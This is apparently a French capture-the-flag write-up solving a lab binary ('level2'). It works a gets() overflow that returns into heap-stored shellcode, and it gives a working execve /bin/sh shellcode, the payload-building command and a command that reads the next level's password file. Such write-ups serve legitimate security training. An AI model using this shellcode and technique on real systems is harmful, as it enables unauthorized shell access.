### Level 2

#### Etape 01 :

On ouvre le binaire et on inspecte la fonction `p()`.
On retrouve un `gets()` (donc un buffer overflow possible), mais avec une protection :
- le programme vérifie l'adresse de retour ;
- si cette adresse appartient à la stack (plage `0xb...`), il quitte avec `_exit(1)`.

Conclusion : on ne peut pas simplement faire un retour vers la stack.

#### Etape 02 :

La fonction fait ensuite un `strdup(local_50)`.
`strdup()` alloue la chaîne sur le tas (heap), donc l'idée est :
- injecter un shellcode dans l'entrée ;
- laisser `strdup()` copier ce shellcode dans la heap ;
- écraser l'adresse de retour avec une adresse située dans la heap.

Shellcode utilisé (21 octets) :

```bash
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
soit `execve("/bin//sh", NULL, NULL)`

#### Etape 03 :

On récupère l'adresse de la heap avec `ltrace` :

```bash
ltrace ./level2
```

On obtient une valeur du type `strdup(...) = 0x0804a008`.
On calcule ensuite l'offset jusqu'à l'EIP  buffer fait 76 octets, puis tu as 4 octets de sauvegarde EBP avant EIP, donc (76 + 4 = 80). :
- offset = `80` ;
- padding = `80 - 21 = 59`. (la taille du shellcode)

On construit alors le payload :

```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "e"*59 + "\x08\xa0\x04\x08"' > /tmp/payload
```

#### Etape 04 :

On exécute le binaire avec le payload :

```bash
cat /tmp/payload - | ./level2
```

Si tout est correct, on obtient un shell avec les droits du niveau suivant.
Il suffit ensuite de lire le mot de passe :

```bash
cat /home/user/level3/.pass
```
